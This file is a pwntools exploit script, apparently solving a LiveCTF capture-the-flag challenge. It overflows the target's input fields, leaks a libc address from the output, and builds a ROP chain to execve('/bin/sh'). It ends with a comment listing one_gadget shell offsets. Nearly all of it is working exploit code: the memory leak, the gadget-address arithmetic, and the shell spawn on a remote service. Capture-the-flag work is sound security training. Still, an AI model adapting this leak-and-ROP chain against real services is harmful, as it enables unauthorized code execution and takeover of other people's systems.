from pwn import *
global p

# 
context.arch='amd64'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
context.terminal = "kitty"

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
local = False

# p = process("/bin/env")

libc = ELF('./libc.so.6')
# p = process("/bin/env",env={'LD_PRELOAD':"./libc.so.6"})
p = None
if local:
    p = process('./challenge',env={'LD_PRELOAD':"./libc.so.6"})
    print("X")
else:
    p = remote(HOST, int(PORT))


ru 		= lambda a: 	p.readuntil(a)
r 		= lambda n:		p.read(n)
sla 	= lambda a,b: 	p.sendlineafter(a,b)
sa 		= lambda a,b: 	p.sendafter(a,b)
sl		= lambda a: 	p.sendline(a)
s 		= lambda a: 	p.send(a)




import re
def dec(sometext):
    # 7-bit C1 ANSI sequences
    ansi_escape = re.compile(rb'''
        \x1B  # ESC
        (?:   # 7-bit C1 Fe (except CSI)
            [@-Z\\-_]
        |     # or [ for CSI, followed by a control sequence
            \[
            [0-?]*  # Parameter bytes
            [ -/]*  # Intermediate bytes
            [@-~]   # Final byte
        )
    ''', re.VERBOSE)
    result = ansi_escape.sub(b'', sometext)
    return result

sla(b"?\n","10")
sla(b"?\n","7")
# ru(b'?\n')
# for x in range(9):
    # p.sendline(b"\xff")

p.sendafter(b'?\n', b'\xff'*9+b'0')
p.sendafter(b'?\n', b'\xff'*9+b'0'+b'\xff'*(0x30-10))
p.sendafter(b'?\n', b'\xff'*9+b'0'+b'\xff'*(0x30-10))
p.sendafter(b'?\n', b'\xff'*9+p8(0xff)+b'\xff'*(0x30-10))
pay = b"X"
# gdb.attach(p,"""
# # bof 0x167A
# bof 0x179F""")
ropp = flat([0])
# 0x3837363534333231

pay = ropp.ljust(64,b'\x50')+flat([0x000060b000000000,0,0,0,0])+b'\x00'*88
# context.log_level='debug'
p.sendafter(b'?\n', b'\xff'*9+p8(0xff)+pay)
data = ru(b'#6?')
#  30 6d  20
x = 0 
res = dec(data).split(b" ")
leaked = []
for x in range(529,529+12,2):
    # print(x,res[x])
    leaked.append(res[x][0])
leak = 0
leaked +=[0,0]
leaked = leaked[::-1]

for x in leaked:
    leak*=0x100
    leak+=int(x)

warning(hex(leak))

assert((leak&0xff)==0x90)
# input()
# pay = b'\x99'*len(pay)
p.send(p64(0x132132)+b'\1'*66+flat([0x000060b000000000,]))
g = cyclic_gen()
base = leak - (0x7ffff7c29d90-0x7ffff7c00000)
rdi     = 0x000000000002a3e5+base
rsi     = 0x000000000002be51+base
rdx     = 0x000000000011f497+base
system  = libc.sym['execve']+base
ppp = 0x0000000000044d41+base
shstr   = libc.search(b"/bin/sh").__next__()+base
ropchain = [rdi,shstr,rsi,0,rdx,0,0,system]
p.send(flat([1,2,3,4,5,6,7,8,9,10,11,12,13])+g.get(46)+flat([ppp])+g.get(24)+flat(ropchain))
p.send(cyclic(0x80))
# 0x7fffffffda62
p.sendline(b"./submitter")
p.sendline(b"./submitter")
p.sendline(b'sleep 10 && exit')
warning('%s', p.recvline_contains(b'LiveCTF{').decode().strip())


p.interactive()

'''
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
'''